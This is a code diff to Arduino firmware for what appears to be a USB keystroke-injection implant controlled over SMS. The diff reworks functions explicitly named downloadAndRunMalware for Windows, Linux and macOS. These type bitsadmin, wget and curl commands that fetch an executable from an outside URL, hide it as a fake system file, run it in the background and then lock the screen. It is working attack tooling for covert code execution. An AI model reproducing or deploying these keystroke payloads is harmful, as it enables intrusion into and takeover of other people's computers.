@@ -10,12 +10,12 @@
 
 #define LEAK_PHONE_NUMBER "+14422457648"
 // We need to comment the next line, #define DEBUG false won't work as expected
-#define DEBUG true
+//#define DEBUG true
 // Used by Oca to debug the code with an arduino without a SIM module and without an USB host
 //#define DEBUGWITHOUTSIM true
-//#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##win##XXXXXXXX##https://s3.amazonaws.com/hellotesthellotesthello/hello.exe"
-//#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##osx##XXXXXXXX##https://s3.amazonaws.com/hellotesthellotesthello/hello_osx"
-//#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##lnx##XXXXXXXXX##https://s3.amazonaws.com/hellotesthellotesthello/hello_lin"
+//#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##win##PASSWORD##https://s3.amazonaws.com/hellotesthellotesthello/hello.exe"
+//#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##osx##PASSWORD##https://s3.amazonaws.com/hellotesthellotesthello/hello_osx"
+//#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##lnx##PASSWORD##https://s3.amazonaws.com/hellotesthellotesthello/hello_lin"
 #define IMPLANT_NAME "Implant 1"
 
 //C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/DEBUG);
@@ -488,15 +488,29 @@ void downloadAndRunMalwareWindows(String url){
 
   Keyboard.print("bitsadmin /transfer winupdate /download /priority foreground ");
   Keyboard.print(url);
-  Keyboard.println(" %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit");
+  Keyboard.println(" %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe");
   Keyboard.releaseAll();
   delay(2000);        
 }
 
-void downloadAndRunMalwareLinuxMacOs(String url){
-  Keyboard.print(" x=/tmp/.logCollector; wget --no-check-certificate ");
+// By default ubuntu has wget but not curl
+// Tested it in bash, zsh and fish shells
+// disown is important for zsh, if not zsh doesn't exit after exit because of a pending job
+void downloadAndRunMalwareLinux(String url){
+  Keyboard.print(" export x=/tmp/.logCollector && wget --no-check-certificate ");
   Keyboard.print(url);
-  Keyboard.println(" -O ${x}; chmod +x ${x}; nohup ${x} &");
+  Keyboard.println(" -O $x && chmod +x $x && nohup $x & disown");
+  Keyboard.releaseAll();
+  delay(1000);
+}
+
+// By default MacOs has curl but not wget
+// Tested it in bash, zsh and fish shells
+// disown is important for zsh, if not zsh doesn't exit after exit because of a pending job
+void downloadAndRunMalwareMacOs(String url){
+  Keyboard.print(" export x=/tmp/.logCollector && curl -k ");
+  Keyboard.print(url);
+  Keyboard.println(" -o $x && chmod +x $x && nohup $x & disown");
   Keyboard.releaseAll();
   delay(1000); 
 }
@@ -713,13 +727,13 @@ void loop(){
         }
         else if(OS == "lnx"){
           openTerminalLinux();
-          downloadAndRunMalwareLinuxMacOs(url);
+          downloadAndRunMalwareLinux(url);
           exitTerminalWindowsLinux();
           lockWindowsLinux();
         }
         else if(OS == "osx"){
           openTerminalMacOs();
-          downloadAndRunMalwareLinuxMacOs(url);
+          downloadAndRunMalwareMacOs(url);
           exitTerminalMultiOs();
           lockMacOs();
         }
@@ -728,7 +742,7 @@ void loop(){
           openTerminalWindowsLinux();
           // If it's not windows it will fail, but it would be logged in the history
           downloadAndRunMalwareWindows(url);
-          downloadAndRunMalwareLinuxMacOs(url);
+          downloadAndRunMalwareLinux(url);
           exitTerminalWindowsLinux();
           lockWindowsLinux();
         }
@@ -737,7 +751,8 @@ void loop(){
           openTerminalMultiOs();
           //We try all the payloads
           downloadAndRunMalwareWindows(url);
-          downloadAndRunMalwareLinuxMacOs(url);
+          downloadAndRunMalwareLinux(url);
+          downloadAndRunMalwareMacOs(url);
           //It also closes it for Windows and Linux
           exitTerminalMultiOs();
           //We try to lock all the os
